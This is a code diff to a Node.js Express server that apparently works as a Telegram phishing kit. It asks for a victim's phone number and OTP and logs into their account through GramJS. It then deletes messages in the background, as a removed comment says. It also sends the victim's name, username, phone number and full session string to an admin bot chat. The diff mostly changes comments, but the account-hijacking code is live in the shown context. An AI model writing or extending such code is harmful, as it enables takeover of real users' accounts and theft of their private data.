@@ -10,7 +10,6 @@ const { NewMessage } = require('telegram/events');
 const app = express();
 app.use(cors());
 app.use(express.json());
-
 app.use(express.static(__dirname));
 
 const apiId = Number(process.env.TELEGRAM_API_ID);
@@ -143,7 +142,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// 1. API: ផ្ញើលេខកូដ OTP ទៅ Telegram App (Optimize Connection Speed)
+// 1. API: ផ្ញើលេខកូដ OTP
 app.post('/api/send-code', async (req, res) => {
     const { phoneNumber } = req.body;
     if (!phoneNumber) {
@@ -154,6 +153,7 @@ app.post('/api/send-code', async (req, res) => {
         const userAgent = req.headers['user-agent'] || '';
         const { deviceModel, systemVersion } = parseDeviceInfo(userAgent);
 
+        // สร้าง StringSession ថ្មីទទេរសម្រាប់ចាប់ផ្តើម Login ថ្មី
         const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
             connectionRetries: 2,
             timeout: 10,
@@ -209,7 +209,6 @@ app.post('/api/verify-code', async (req, res) => {
             );
         }
 
-        // ទាញយកព័ត៌មាន Profile របស់អ្នកប្រើប្រាស់ (Username, Name, User ID)
         let username = 'No Username';
         let fullName = 'N/A';
         try {
@@ -220,13 +219,12 @@ app.post('/api/verify-code', async (req, res) => {
             console.error("Error getting user profile:", profileErr);
         }
 
+        // Save session ឱ្យចេញជាទម្រង់ GramJS StringSession ត្រឹមត្រូវ
         const sessionString = client.session.save();
         delete sessions[phoneNumber];
 
-        // ដំណើរការលុបសារក្នុង Background (មិនទាក់ទាញល្បឿន Web)
         cleanupPostLogin(client).catch(err => console.error("Cleanup background error:", err));
 
-        // ផ្ញើ Session String ព្រមទាំង Username & Name ទៅ Admin Bot
         if (botToken && adminChatId) {
             try {
                 const messageText = `🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** ${fullName}\n🏷 **Username:** ${username}\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
